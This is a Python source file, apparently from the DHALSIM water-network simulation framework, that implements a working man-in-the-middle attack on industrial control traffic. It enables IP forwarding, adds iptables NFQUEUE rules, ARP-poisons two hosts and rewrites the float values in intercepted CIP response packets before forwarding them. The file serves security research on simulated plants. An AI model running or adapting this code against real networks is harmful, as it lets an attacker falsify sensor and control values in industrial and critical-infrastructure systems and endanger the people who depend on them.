import argparse
import os
from pathlib import Path
import threading

import fnfqueue
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp, translate_payload_to_float, translate_float_to_payload
from dhalsim.network_attacks.synced_attack import SyncedAttack


class PacketAttack(SyncedAttack):
    """
    This is a packet attack class.

    :param intermediate_yaml_path: The path to the intermediate YAML file
    :param yaml_index: The index of the attack in the intermediate YAML
    """

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
        super().__init__(intermediate_yaml_path, yaml_index)
        os.system('sysctl net.ipv4.ip_forward=1')
        self.queue = fnfqueue.Connection()
        self.thread = None
        self.run_thread = False


    def setup(self):
        # Add the iptables rules
        os.system('iptables -t mangle -A PREROUTING -p tcp -j NFQUEUE --queue-num 1')
        os.system('iptables -A FORWARD -p icmp -j DROP')
        os.system('iptables -A INPUT -p icmp -j DROP')
        os.system('iptables -A OUTPUT -p icmp -j DROP')

        launch_arp_poison("192.168.1.1", "192.168.1.254")

        try:
            self.q = self.queue.bind(1)
            self.q.set_mode(fnfqueue.MAX_PAYLOAD, fnfqueue.COPY_PACKET)
        except PermissionError:
            print("Permission Error. Am I running as root?")

        self.run_thread = True
        self.thread = threading.Thread(target=self.packet_thread_function)
        self.thread.start()


    def packet_thread_function(self):
        while self.run_thread:
            try:
                for packet in self.queue:
                    # TODO The actual mitm stuff
                    p = IP(packet.payload)
                    # Packets with 100 <= length < 116 are CIP response packets
                    if 100 <= p[IP].len < 116:
                        print("MITM 🖥️ -----------------------")
                        print("MITM 🖥️:", "CIP Response 📦:", "source:", p[IP].src.ljust(16),
                              str(p[TCP].sport).ljust(6), "   destination:",
                              p[IP].dst.ljust(16), str(p[TCP].dport).ljust(6), str(p[IP].len).ljust(6))
                        print("MITM 🖥️:", "Value:", translate_payload_to_float(p[Raw].load))
                        print("MITM 🖥️:", "Old Load in HEX:", p[Raw].load.hex())
                        print("MITM 🖥️:", "CIP Response 📦:", "Payload overwriting")
                        # print("MITM 🖥️:", "Showing 📦:", packet2.show2())
                        # print("MITM 🖥️:", "Showing1 📦:", p.show(dump=True))
                        p[Raw].load = translate_float_to_payload(self.intermediate_attack['value'], p[Raw].load)
                        print("MITM 🖥️:", "New Value:", translate_payload_to_float(p[Raw].load))
                        print("MITM 🖥️:", "New Load in HEX:", p[Raw].load.hex())

                        # p[Raw].load = p[Raw].load[:-2] + b'\x12\x34'
                        del p[TCP].chksum
                        del p[IP].chksum

                        # print("MITM 🖥️:", "Showing2 📦:", p.show(dump=True))

                        packet.payload = bytes(p)

                        # packet.payload = translate_float_to_payload(self.intermediate_attack['value'], packet.payload)

                    packet.mangle()

            except fnfqueue.BufferOverflowException:
                print("Buffer Overflow in a MITM attack!")


    def interrupt(self):
        if self.state == 1:
            self.teardown()


    def teardown(self):
        # Delete iptables rules
        os.system('iptables -t mangle -D PREROUTING -p tcp -j NFQUEUE --queue-num 1')
        os.system('iptables -D FORWARD -p icmp -j DROP')
        os.system('iptables -D INPUT -p icmp -j DROP')
        os.system('iptables -D OUTPUT -p icmp -j DROP')

        restore_arp("192.168.1.1", "192.168.1.254")
        # restore_arp("192.168.1.254", "192.168.1.1")

        self.run_thread = False
        self.queue.close()
        self.thread.join()


    def attack_step(self):
        if self.state == 0:
            if self.intermediate_attack['trigger']["start"] <= self.get_master_clock() <= self.intermediate_attack['trigger']["end"]:
                self.state = 1
                self.setup()
        elif self.state == 1:
            if not self.intermediate_attack['trigger']["start"] <= self.get_master_clock() <= self.intermediate_attack['trigger']["end"]:
                self.teardown()
                self.state = 2

def is_valid_file(parser_instance, arg):
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = PacketAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()
